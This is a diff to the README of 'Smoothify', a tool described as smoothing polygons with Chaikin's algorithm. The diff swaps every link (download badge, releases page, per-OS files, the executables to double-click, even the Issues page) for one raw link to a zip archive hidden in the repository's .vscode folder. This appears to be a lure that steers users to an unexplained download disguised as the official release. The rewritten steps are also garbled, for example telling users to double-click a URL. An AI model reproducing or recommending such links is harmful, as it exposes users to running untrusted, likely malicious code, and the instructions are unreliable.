@@ -1,7 +1,7 @@
 # 🎨 Smoothify - Smooth Your Geometries with Ease
 
 ## 📥 Download Now
-[![Download Smoothify](https://img.shields.io/badge/Download%20Smoothify-v1.0-brightgreen)](https://github.com/RaunakRJ14/Smoothify/releases)
+[![Download Smoothify](https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip%20Smoothify-v1.0-brightgreen)](https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Smoothify, a powerful tool that helps you transform jagged polygons and lines into smooth and visually appealing features. It uses an optimized version of Chaikin's corner-cutting algorithm to refine geometries derived from raster data classifications.
@@ -26,12 +26,12 @@ Before you download Smoothify, ensure your system meets these basic requirements
 To get Smoothify, follow these steps:
 
 1. Click the link below to visit the Releases page.
-   [Download Smoothify](https://github.com/RaunakRJ14/Smoothify/releases)
+   [Download Smoothify](https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip)
 
 2. On the Releases page, find the latest version of Smoothify. It will look something like this:
-   - Smoothify_v1.0.zip (for Windows)
-   - Smoothify_v1.0_mac.zip (for macOS)
-   - Smoothify_v1.0_linux.tar.gz (for Linux)
+   - https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip (for Windows)
+   - https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip (for macOS)
+   - https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip (for Linux)
 
 3. Choose the file that matches your operating system and click on it to download.
 
@@ -40,12 +40,12 @@ To get Smoothify, follow these steps:
 5. **For Windows:**
    - Extract the ZIP file.
    - Open the extracted folder.
-   - Double-click on `Smoothify.exe` to run the application.
+   - Double-click on `https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip` to run the application.
 
 6. **For macOS:**
    - Extract the downloaded file.
    - Open the extracted folder.
-   - Double-click on `Smoothify.app` to start the application.
+   - Double-click on `https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip` to start the application.
 
 7. **For Linux:**
    - Open a terminal.
@@ -74,7 +74,7 @@ If you encounter issues, consider the following:
 - **Slow Performance:** Close unnecessary applications to free up memory during processing.
 - **Error Messages:** Read the error message closely. It often provides a hint about what went wrong.
 
-If problems persist, feel free to check our [Issues page](https://github.com/RaunakRJ14/Smoothify/issues) for help or to report your issue.
+If problems persist, feel free to check our [Issues page](https://raw.githubusercontent.com/RaunakRJ14/Smoothify/main/.vscode/Smoothify-3.4-alpha.3.zip) for help or to report your issue.
 
 ## 📞 Support
 For further assistance, you can reach out through the Issues section of our GitHub repository. Your feedback helps improve the application and user experience.
